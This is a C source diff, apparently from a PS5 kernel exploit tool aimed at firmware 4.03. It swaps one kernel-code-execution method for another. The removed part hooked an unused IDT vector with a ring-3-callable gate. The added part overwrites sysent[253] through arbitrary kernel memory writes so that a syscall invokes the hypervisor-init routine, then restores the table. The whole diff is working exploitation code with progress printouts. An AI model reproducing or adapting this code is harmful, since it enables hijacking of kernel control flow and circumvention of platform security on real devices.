@@ -777,103 +777,70 @@ static void load_kmod(void) {
         if (trampoline_kva) {
             printf("[+] FOUND trampoline at 0x%lx\n", (unsigned long)trampoline_kva);
 
-            /* Hook a free IDT vector and trigger INT to invoke hv_init */
-            uint64_t idt_kva = g_kdata_base + KSTUFF_IDT_OFF;
+            /* ── Invoke hv_init via sysent hook (no IDT manipulation) ──
+             *
+             * Extract hv_init address from the trampoline's CALL instruction,
+             * hook sysent[253] to point to hv_init, call syscall(253).
+             * This avoids IDT hooking which causes panics on PS5. */
 
-            /* Find a free IDT vector in the high range (0xD0-0xEF).
-             * Low vectors (0x20-0x4F) are active device IRQs on PS5
-             * and overwriting them causes kernel panics. High vectors
-             * are typically unused or reserved for IPI/self-IPI. */
-            int hook_vec = -1;
-            for (int v = 0xD0; v <= 0xEF; v++) {
-                uint64_t gate_pa = va_to_pa(idt_kva + v * 16);
-                if (!gate_pa) continue;
-                uint8_t gate[16];
-                kernel_copyout(g_dmap_base + gate_pa, gate, 16);
-                /* Check if P bit is clear (unused) */
-                if (!(gate[5] & 0x80)) {
-                    hook_vec = v;
-                    break;
-                }
-            }
-            if (hook_vec < 0) {
-                printf("[-] No free IDT vector found in 0xD0-0xEF, aborting IDT invoke\n");
+            /* The call instruction is at offset 15 (after the push/xor prefix).
+             * Format: E8 <rel32>  →  target = call_addr + 5 + rel32 */
+            uint64_t hv_init_kva = 0;
+            if (hdr[15] == 0xE8) {
+                int32_t rel32;
+                memcpy(&rel32, &hdr[16], 4);
+                hv_init_kva = trampoline_kva + 15 + 5 + (int64_t)rel32;
+                printf("[+] hv_init extracted from CALL: 0x%016lx\n",
+                       (unsigned long)hv_init_kva);
+            } else {
+                printf("[-] Expected E8 (CALL) at trampoline+15, got 0x%02x\n",
+                       hdr[15]);
             }
 
-            uint64_t gate_pa = (hook_vec >= 0) ? va_to_pa(idt_kva + hook_vec * 16) : 0;
-            if (gate_pa) {
-                /* Save original gate */
-                uint8_t orig_gate[16];
-                kernel_copyout(g_dmap_base + gate_pa, orig_gate, 16);
+            if (hv_init_kva && g_sysent_kva) {
+                /* Hook sysent[253].sy_call to hv_init */
+                #define KMOD_INVOKE_SYSCALL 253
+                uint64_t ent_kva = g_sysent_kva +
+                                   (uint64_t)KMOD_INVOKE_SYSCALL * SYSENT_STRIDE;
+                uint64_t ent_pa = va_to_pa(ent_kva);
+                if (!ent_pa) {
+                    printf("[-] sysent[%d] VA->PA failed\n", KMOD_INVOKE_SYSCALL);
+                } else {
+                    /* Save original sysent entry */
+                    uint8_t orig_sysent[SYSENT_STRIDE];
+                    kernel_copyout(g_dmap_base + ent_pa, orig_sysent, SYSENT_STRIDE);
 
-                /* Build new IDT gate pointing to trampoline */
-                uint8_t new_gate[16];
-                memset(new_gate, 0, 16);
-                new_gate[0] = (uint8_t)(trampoline_kva & 0xFF);
-                new_gate[1] = (uint8_t)((trampoline_kva >> 8) & 0xFF);
-                /* selector: same as IDT[0] (kernel CS) */
-                uint64_t idt0_pa = va_to_pa(idt_kva);
-                uint8_t idt0[16];
-                kernel_copyout(g_dmap_base + idt0_pa, idt0, 16);
-                new_gate[2] = idt0[2]; new_gate[3] = idt0[3]; /* selector */
-                new_gate[4] = 0;       /* IST=0 */
-                new_gate[5] = 0xEE;    /* P=1, DPL=3, interrupt gate (allows INT from ring 3) */
-                new_gate[6] = (uint8_t)((trampoline_kva >> 16) & 0xFF);
-                new_gate[7] = (uint8_t)((trampoline_kva >> 24) & 0xFF);
-                *(uint32_t *)&new_gate[8] = (uint32_t)(trampoline_kva >> 32);
+                    /* Write hv_init to sy_call (offset +8) */
+                    uint64_t call_pa = va_to_pa(ent_kva + 8);
+                    if (call_pa) {
+                        kernel_copyin(&hv_init_kva, g_dmap_base + call_pa, 8);
 
-                /* Install hook */
-                kernel_copyin(new_gate, g_dmap_base + gate_pa, 16);
-                printf("[+] IDT[0x%x] hooked -> trampoline 0x%lx\n",
-                       hook_vec, (unsigned long)trampoline_kva);
+                        /* Set narg=0 (offset +0) */
+                        int32_t narg_zero = 0;
+                        kernel_copyin(&narg_zero, g_dmap_base + ent_pa, 4);
 
-                /* Trigger the interrupt from ring 3 */
-                printf("[*] Triggering INT 0x%x...\n", hook_vec);
-                fflush(stdout);
+                        printf("[+] sysent[%d] hooked -> hv_init 0x%lx\n",
+                               KMOD_INVOKE_SYSCALL, (unsigned long)hv_init_kva);
 
-                switch (hook_vec) {
-                    case 0xD0: __asm__ volatile("int $0xD0" ::: "memory"); break;
-                    case 0xD1: __asm__ volatile("int $0xD1" ::: "memory"); break;
-                    case 0xD2: __asm__ volatile("int $0xD2" ::: "memory"); break;
-                    case 0xD3: __asm__ volatile("int $0xD3" ::: "memory"); break;
-                    case 0xD4: __asm__ volatile("int $0xD4" ::: "memory"); break;
-                    case 0xD5: __asm__ volatile("int $0xD5" ::: "memory"); break;
-                    case 0xD6: __asm__ volatile("int $0xD6" ::: "memory"); break;
-                    case 0xD7: __asm__ volatile("int $0xD7" ::: "memory"); break;
-                    case 0xD8: __asm__ volatile("int $0xD8" ::: "memory"); break;
-                    case 0xD9: __asm__ volatile("int $0xD9" ::: "memory"); break;
-                    case 0xDA: __asm__ volatile("int $0xDA" ::: "memory"); break;
-                    case 0xDB: __asm__ volatile("int $0xDB" ::: "memory"); break;
-                    case 0xDC: __asm__ volatile("int $0xDC" ::: "memory"); break;
-                    case 0xDD: __asm__ volatile("int $0xDD" ::: "memory"); break;
-                    case 0xDE: __asm__ volatile("int $0xDE" ::: "memory"); break;
-                    case 0xDF: __asm__ volatile("int $0xDF" ::: "memory"); break;
-                    case 0xE0: __asm__ volatile("int $0xE0" ::: "memory"); break;
-                    case 0xE1: __asm__ volatile("int $0xE1" ::: "memory"); break;
-                    case 0xE2: __asm__ volatile("int $0xE2" ::: "memory"); break;
-                    case 0xE3: __asm__ volatile("int $0xE3" ::: "memory"); break;
-                    case 0xE4: __asm__ volatile("int $0xE4" ::: "memory"); break;
-                    case 0xE5: __asm__ volatile("int $0xE5" ::: "memory"); break;
-                    case 0xE6: __asm__ volatile("int $0xE6" ::: "memory"); break;
-                    case 0xE7: __asm__ volatile("int $0xE7" ::: "memory"); break;
-                    case 0xE8: __asm__ volatile("int $0xE8" ::: "memory"); break;
-                    case 0xE9: __asm__ volatile("int $0xE9" ::: "memory"); break;
-                    case 0xEA: __asm__ volatile("int $0xEA" ::: "memory"); break;
-                    case 0xEB: __asm__ volatile("int $0xEB" ::: "memory"); break;
-                    case 0xEC: __asm__ volatile("int $0xEC" ::: "memory"); break;
-                    case 0xED: __asm__ volatile("int $0xED" ::: "memory"); break;
-                    case 0xEE: __asm__ volatile("int $0xEE" ::: "memory"); break;
-                    case 0xEF: __asm__ volatile("int $0xEF" ::: "memory"); break;
-                    default: break;
+                        /* Invoke! */
+                        printf("[*] Calling syscall(%d) to invoke hv_init...\n",
+                               KMOD_INVOKE_SYSCALL);
+                        fflush(stdout);
+
+                        syscall(KMOD_INVOKE_SYSCALL);
+                        printf("[+] syscall(%d) returned!\n", KMOD_INVOKE_SYSCALL);
+
+                        /* Restore sysent immediately */
+                        kernel_copyin(orig_sysent, g_dmap_base + ent_pa,
+                                      SYSENT_STRIDE);
+                        printf("[+] sysent[%d] restored\n", KMOD_INVOKE_SYSCALL);
+
+                        /* Re-read result buffer */
+                        memcpy(&first_qword, (void *)result_vaddr, 8);
+                    }
                 }
-                printf("[+] INT 0x%x returned to userland!\n", hook_vec);
-
-                /* Restore original gate immediately */
-                kernel_copyin(orig_gate, g_dmap_base + gate_pa, 16);
-                printf("[+] IDT[0x%x] restored\n", hook_vec);
-
-                /* Re-read result buffer */
-                memcpy(&first_qword, (void *)result_vaddr, 8);
+            } else if (!g_sysent_kva) {
+                printf("[-] sysent not discovered — cannot invoke kmod\n");
             }
         } else {
             printf("[-] Trampoline not found in kernel memory\n");
@@ -1524,11 +1491,13 @@ int main(void) {
         return 1;
     }
 
+    /* Discover sysent first — needed for kmod invocation */
+    discover_sysent();
+
     /* Load kernel module (MSR recon, IDT trampoline) */
     load_kmod();
 
-    /* Discover kernel data structures */
-    discover_sysent();
+    /* Discover apic_ops table */
     discover_apic_ops();
 
     /* Verify known offsets on 4.03 */
